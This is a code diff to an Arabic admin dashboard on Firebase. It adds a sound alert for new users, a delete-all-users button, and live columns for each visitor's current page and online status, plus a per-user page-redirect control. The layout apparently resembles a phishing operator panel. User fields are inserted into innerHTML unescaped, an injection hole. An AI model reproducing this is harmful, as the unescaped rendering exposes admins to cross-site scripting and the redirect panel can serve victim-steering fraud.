@@ -299,6 +299,15 @@ td{
     تسجيل الخروج
 </button>
 
+<button class="route-btn" id="enableSoundBtn">
+    تفعيل الصوت
+</button>
+
+<button class="route-btn" id="deleteAllBtn"
+style="background:linear-gradient(135deg,#dc2626,#ef4444)">
+    حذف جميع المستخدمين
+</button>
+
     </div>
 
     <div class="table-wrap">
@@ -307,12 +316,14 @@ td{
 
             <thead>
 
-                <tr>
-                    <th>الاسم</th>
-                    <th>الرقم</th>
-                    <th>الحالة</th>
-                    <th>التحكم</th>
-                </tr>
+              <tr>
+    <th>الاسم</th>
+    <th>الرقم</th>
+    <th>الحالة</th>
+    <th>الصفحة الحالية</th>
+    <th>الاتصال</th>
+    <th>التحكم</th>
+</tr>
 
             </thead>
 
@@ -392,11 +403,13 @@ import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/fireba
 
 import {
 
-    getFirestore,
+      getFirestore,
     collection,
     onSnapshot,
     doc,
-    updateDoc
+    updateDoc,
+    getDocs,
+    deleteDoc
 
 } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
 
@@ -446,45 +459,86 @@ const pageSelect = document.getElementById("pageSelect");
 let currentUserId = null;
 
 /* realtime users */
+let firstLoad = true;
+
+const audio = new Audio(
+    "assets/notification.wav"
+);
 
 onSnapshot(collection(db,"users"), (snapshot)=>{
 
     usersTable.innerHTML = "";
 
-    snapshot.forEach((docSnap)=>{
+if(!firstLoad && snapshot.docChanges().length > 0){
 
-        const user = docSnap.data();
+    audio.play().catch(()=>{});
 
-        usersTable.innerHTML += `
+}
 
-        <tr>
+   const users = [];
 
-            <td>${user.name || '-'}</td>
+snapshot.forEach((docSnap)=>{
 
-            <td>${user.phone || '-'}</td>
-
-            <td>
-                <div class="status">
-                    ${user.status || 'pending'}
-                </div>
-            </td>
-
-            <td>
-
-                <button
-                    class="route-btn"
-                    onclick="openPopup('${docSnap.id}')"
-                >
-                    توجيه
-                </button>
-
-            </td>
-
-        </tr>
-
-        `;
-
+    users.push({
+        id: docSnap.id,
+        ...docSnap.data()
     });
+
+});
+
+/* newest first */
+
+users.sort((a,b)=>(b.createdAt || 0) - (a.createdAt || 0));
+
+users.forEach((user)=>{
+
+    const online =
+        Date.now() - (user.lastSeen || 0) < 15000;
+
+    usersTable.innerHTML += `
+
+    <tr>
+
+        <td>${user.name || '-'}</td>
+
+        <td>${user.phone || '-'}</td>
+
+        <td>
+            <div class="status">
+                ${user.status || 'pending'}
+            </div>
+        </td>
+
+        <td>
+            ${user.currentPage || '-'}
+        </td>
+
+        <td>
+            <div class="status"
+                 style="
+                 background:${online ? 'rgba(34,197,94,.15)' : 'rgba(239,68,68,.15)'};
+                 color:${online ? '#22c55e' : '#ef4444'};
+                 ">
+                ${online ? 'Online' : 'Offline'}
+            </div>
+        </td>
+
+        <td>
+
+            <button
+                class="route-btn"
+                onclick="openPopup('${user.id}')"
+            >
+                توجيه
+            </button>
+
+        </td>
+
+    </tr>
+
+    `;
+    });
+firstLoad = false;
 
 });
 
@@ -578,6 +632,81 @@ document.getElementById("logoutBtn").onclick = async ()=>{
     await signOut(auth);
 
     window.location.href = "admin-login.html";
+
+};
+
+const enableSoundBtn =
+    document.getElementById("enableSoundBtn");
+
+enableSoundBtn.onclick = async ()=>{
+
+    try{
+
+        audio.volume = 1;
+
+        await audio.play();
+
+        audio.pause();
+
+        audio.currentTime = 0;
+
+        alert("تم تفعيل الصوت");
+
+    }catch(error){
+
+        alert("المتصفح منع تشغيل الصوت");
+
+    }
+
+};
+
+
+const deleteAllBtn =
+    document.getElementById("deleteAllBtn");
+
+deleteAllBtn.onclick = async ()=>{
+
+    const confirmDelete = confirm(
+        "هل أنت متأكد من حذف جميع المستخدمين ؟"
+    );
+
+    if(!confirmDelete) return;
+
+    try{
+
+        deleteAllBtn.disabled = true;
+
+        deleteAllBtn.innerText = "جاري الحذف...";
+
+        const snapshot =
+            await getDocs(collection(db,"users"));
+
+        const promises = [];
+
+        snapshot.forEach((docSnap)=>{
+
+            promises.push(
+                deleteDoc(doc(db,"users",docSnap.id))
+            );
+
+        });
+
+        await Promise.all(promises);
+
+        alert("تم حذف جميع المستخدمين");
+
+    }catch(error){
+
+        console.log(error);
+
+        alert("حدث خطأ أثناء الحذف");
+
+    }
+
+    deleteAllBtn.disabled = false;
+
+    deleteAllBtn.innerText =
+        "حذف جميع المستخدمين";
 
 };
 
